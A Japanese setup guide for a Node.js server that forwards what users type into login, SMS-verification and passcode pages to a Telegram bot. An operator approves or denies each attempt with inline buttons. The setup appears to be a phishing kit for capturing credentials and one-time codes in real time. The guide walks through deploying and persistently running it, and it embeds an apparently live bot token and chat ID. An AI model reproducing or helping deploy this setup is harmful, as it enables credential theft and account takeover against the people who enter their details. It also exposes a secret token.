# Telegram通知 セットアップガイド（Node.js版）

## 📋 概要
このガイドではNode.js/Expressを使用してTelegram通知を確実に送信するサーバーを立てます。

プロキシなしで直接Telegram APIと通信できます。

---

## 🔧 セットアップ手順（3ステップ）

### ステップ1️⃣: Node.jsをインストール

https://nodejs.org からNode.jsをダウンロード＆インストール

### ステップ2️⃣: サーバーファイルを準備

以下のファイルをダウンロードして**同じフォルダ**に配置：
- `server.js`
- `package.json`

### ステップ3️⃣: サーバーを起動

コマンドラインを開いて実行：

```bash
# 依存パッケージをインストール
npm install

# サーバーを起動
npm start
```

以下のメッセージが表示されればOK：

```
✅ Telegramプロキシサーバーが起動しました
📍 ポート: 3000
🔗 http://localhost:3000
🧪 ヘルスチェック: http://localhost:3000/health
```

---

## ✅ テスト方法

1. **サーバーを起動**（上記の `npm start`）

2. **ブラウザでHTMLファイルを開く**
   - `login.html`
   - `admin.html`

3. **ログイン情報を入力**
   - メールアドレス
   - パスワード

4. **「ログイン」ボタンをクリック**

5. **ターミナルを確認**
   ```
   ✅ Telegram通知送信成功
   ```

6. **Telegramで確認** 📱
   - Telegramアプリで通知が届いているか確認
   - インラインボタン（✅ 許可 / ❌ 拒否）で操作可能

---

## 🐛 トラブルシューティング

### ❌ サーバーが起動しない

**原因1: Node.jsがインストールされていない**
```bash
node --version
```
バージョンが表示されなければインストールしてください

**原因2: ポート3000が使用中**
```bash
# Macの場合
lsof -i :3000

# Windowsの場合
netstat -ano | findstr :3000
```

別のプロセスが3000を使用している場合は、そのプロセスを終了してください

**原因3: package.jsonが見つからない**
- `server.js` と `package.json` が同じフォルダにあるか確認
- フォルダパスに日本語が含まれていないか確認

### ❌ 通知が届かない

**確認1: サーバーが実行中か**
- ターミナルにエラーメッセージがないか確認
- `http://localhost:3000/health` をブラウザで開く
- JSON形式で `{ "status": "OK" }` が表示されればOK

**確認2: ブラウザのコンソールを確認**
- F12キーで開発者ツールを開く
- Consoleタブでエラーを確認
- 「✅ Telegram通知送信成功」と表示されているか確認

**確認3: トークンとChat IDが正しいか**
`server.js` の以下を確認：
```javascript
const TELEGRAM_TOKEN = '8706478281:AAFQKdItwTQ2X9H85rwUBB6rUHFMWHIfGzU';
const TELEGRAM_CHAT_ID = '8613664459';
```

---

## 🔧 ポート番号を変更したい場合

### server.js を編集

最後の行を変更：

```javascript
// 変更前
const PORT = process.env.PORT || 3000;

// 変更後（例：8080に変更）
const PORT = process.env.PORT || 8080;
```

### HTMLファイルも編集

以下のファイルで `3000` を新しいポート番号に変更：
- `login.html` 
- `sms-verification.html`
- `passcode-confirm.html`
- `admin.html`

検索＆置換（Ctrl+H）で `localhost:3000` を `localhost:8080` に変更

---

## 📁 ファイル構成

```
プロジェクトフォルダ/
├── server.js              ← Telegramプロキシサーバー
├── package.json           ← 依存パッケージ設定
├── login.html             ← ログイン画面
├── sms-verification.html  ← SMS認証画面
├── passcode-confirm.html  ← パスコード確認画面
├── admin.html             ← 管理画面
├── passcode.html          ← 初期パスコード入力画面
└── node_modules/          ← 自動生成（npm install後）
```

---

## 🚀 本番環境での実行

### Windowsの場合

```bash
# コマンドプロンプトで実行
node server.js
```

### Macの場合

```bash
# ターミナルで実行
node server.js
```

### Linuxの場合

```bash
# ターミナルで実行
node server.js

# またはnpmで実行
npm start
```

### 常時実行（PM2を使用）

```bash
# PM2をインストール
npm install -g pm2

# サーバーを常時実行
pm2 start server.js

# ステータス確認
pm2 status

# ログ確認
pm2 logs
```

---

## 🔐 セキュリティ注意

- **トークンを安全に管理してください**
- 本番環境では環境変数を使用することをお勧めします

環境変数を使う場合：

1. `.env` ファイルを作成
```
TELEGRAM_TOKEN=8706478281:AAFQKdItwTQ2X9H85rwUBB6rUHFMWHIfGzU
TELEGRAM_CHAT_ID=8613664459
```

2. `server.js` を編集
```javascript
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
```

---

## 📞 サポート

問題が解決しない場合：
1. ターミナルのエラーメッセージを確認
2. `npm start` でサーバーが起動しているか確認
3. ブラウザコンソール（F12）でエラーを確認
4. Node.jsが最新版かご確認ください

---

## ✨ 動作確認チェックリスト

- [ ] Node.jsをインストール
- [ ] `server.js` と `package.json` をダウンロード
- [ ] `npm install` を実行
- [ ] `npm start` でサーバーを起動
- [ ] `http://localhost:3000/health` にアクセスして確認
- [ ] HTMLファイルを開く
- [ ] ログイン情報を入力して送信
- [ ] Telegramで通知を確認
- [ ] 管理画面で許可/拒否を操作
